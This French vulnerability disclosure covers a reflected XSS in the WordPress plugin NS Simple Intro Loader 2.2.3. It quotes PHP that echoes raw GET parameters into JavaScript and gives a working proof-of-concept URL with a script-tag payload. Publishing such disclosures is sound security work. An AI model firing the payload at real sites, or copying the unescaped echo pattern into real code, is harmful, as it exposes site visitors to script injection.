---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress NS Simple Intro Loader"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [NS Simple Intro Loader](https://wordpress.org/plugins/ns-simple-intro-loader/) se présente de cette façon :

> When plugin enabled you can view a loader before page appear
Page option will appear in your WordPress backend menu, and you can change from two different loader.
This plugin is very quick and simple, and no code required.
>
> Very Simple to use!

La version testée est la 2.2.3 et date d'il y a 2 ans au moment de ces lignes.

## La vulnérabilité

Le script `assets/js/ns-simple-intro-loader-custom.php` retourne du code javascript malgré son extension `.php`.

S'il est appelé directement, toutefois, le navigateur va considérer qu'il s'agit de code HTML et interpréter les balises.

Le code du script est vulnérable au XSS :

```php
jQuery(document).ready(function($) {                                                                                   
    $('#nsSimLoader').introLoader({                                                                                    
        animation: {                                                                                                   
            name: '<?php if (isset($_GET['ns_disp_dim_load']) AND $_GET['ns_disp_dim_load'] != '') { echo $_GET['ns_disp_dim_load']; } else { echo 'gifLoader'; }?>',
            options: {                                                                                                 
                exitFx:'fadeOut',                                                                                      
                ease: 'linear',                                                                                        
                style: '<?php if (isset($_GET['ns_disp_style']) AND $_GET['ns_disp_style'] != '') { echo $_GET['ns_disp_style']; } else { echo 'light'; }?>',
                delayBefore: 500, //delay time in milliseconds                                                         
                loaderText: '<?php if (isset($_GET['ns_loader_text']) AND $_GET['ns_loader_text'] != '') { echo $_GET['ns_loader_text']; } else { echo 'Website is ready!1'; }?>',
                exitTime: 300,                                                                                         
                lettersDelayTime: 0                                                                                    
            }                                                                                                          
        },                                                                                                             
                                                                                                                       
        spinJs: {}                                                                                                     
                                                                                                                       
    });                                                                                                                
});
```

Par conséquent, il suffit d'injecter une balise `script` pour l'exploitation.

PoC :

```
http://localhost:8000/wp-content/plugins/ns-simple-intro-loader/assets/js/ns-simple-intro-loader-custom.php?ns_disp_dim_load=%3CScRiPt%3Ealert%28%27XSS%27%29%3C%2FsCrIpT%3E&ns_disp_style&ns_loader_text&ver=6.4
```

D'autres paramètres `ns_*` sont vulnérables au XSS comme le montre le script PHP.
